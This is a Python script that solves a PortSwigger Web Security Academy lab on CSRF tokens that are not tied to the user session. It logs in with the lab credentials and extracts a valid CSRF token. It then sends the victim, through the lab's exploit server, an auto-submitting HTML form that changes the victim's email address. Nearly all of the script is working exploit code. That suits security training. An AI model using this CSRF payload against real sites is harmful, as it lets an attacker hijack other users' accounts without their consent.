##################################################################################
#
# Lab: CSRF where token is not tied to user session
#
# Hack Steps: 
#      1. Fetch the login page
#      2. Extract the csrf to login
#      3. Login as wiener
#      4. Fetch wiener profile
#      5. Extract the csrf token that is needed for email update
#      6. Craft an HTML form for changing the email address with an auto-submit
#         script and include the extracted csrf token in the form
#      7. Deliver the exploit to the victim
#      8. The victim's email will be changed after they trigger the exploit
#
##################################################################################
import requests
from colorama import Fore
import re

# Change this to your lab URL
LAB_URL = "https://0afe000a04b8ce7c80c52b64005d00ca.web-security-academy.net"

# Change this to your exploit server URL
EXPLOIT_SERVER_URL = "https://exploit-0afa00050433cecc80ee2ab401fc00f5.exploit-server.net"

def main():
    print("⦗1⦘ Fetching the login page.. ", end="", flush=True)

    login_page =fetch(f"{LAB_URL}/login")

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗2⦘ Extracting the csrf token to login.. ", end="", flush=True)
    
    session = login_page.cookies.get("session")
    csrf_token = re.findall("csrf.+value=\"(.+)\"", login_page.text)[0]

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗3⦘ Logging in as wiener.. ", end="", flush=True)

    cookies = { "session": session, "csrf": csrf_token }
    data = { "username": "wiener", "password": "peter", "csrf": csrf_token }
    login_as_wiener = post_data(f"{LAB_URL}/login", data, cookies, False)
 
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗4⦘ Fetching wiener profile.. ", end="", flush=True)

    session = login_as_wiener.cookies.get("session")
    cookies = { "session": session }
    wiener_profile = fetch(f"{LAB_URL}/my-account", cookies)
        
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗5⦘ Extracting the csrf token that is needed for email update.. ", end="", flush=True)

    csrf_token = re.findall("csrf.+value=\"(.+)\"", wiener_profile.text)[0]

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗6⦘ Delivering the exploit to the victim.. ", end="", flush=True)

    new_email = "hacked@you.com" # You can change this to what you want
    payload = f"""<html>
                    <body>
                    <form action="{LAB_URL}/my-account/change-email" method="POST">
                        <input type="hidden" name="email" value="{new_email}" />
                        <input type="hidden" name="csrf" value="{csrf_token}" />
                        <input type="submit" value="Submit request" />
                    </form>
                    <script>
                        document.forms[0].submit();
                    </script>
                    </body>
                </html>"""
    response_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
    data = { "responseHead": response_head, "responseBody": payload, "formAction": "DELIVER_TO_VICTIM", "urlIsHttps": "on", "responseFile": "/exploit" }
    post_data(EXPLOIT_SERVER_URL, data)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The victim's email will be changed after they trigger the exploit") 
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")


def fetch(url, cookies = None):
    try:  
        return requests.get(url, cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch " + url + " through exception")
        exit(1)


def post_data(url, data, cookies = None, allow_redirects = True):
    try:    
        return requests.post(url, data, cookies=cookies, allow_redirects=allow_redirects)
    except:
        print(Fore.RED + "⦗!⦘ Failed to post data to " + url + " through exception")
        exit(1)


if __name__ == "__main__":
    main()


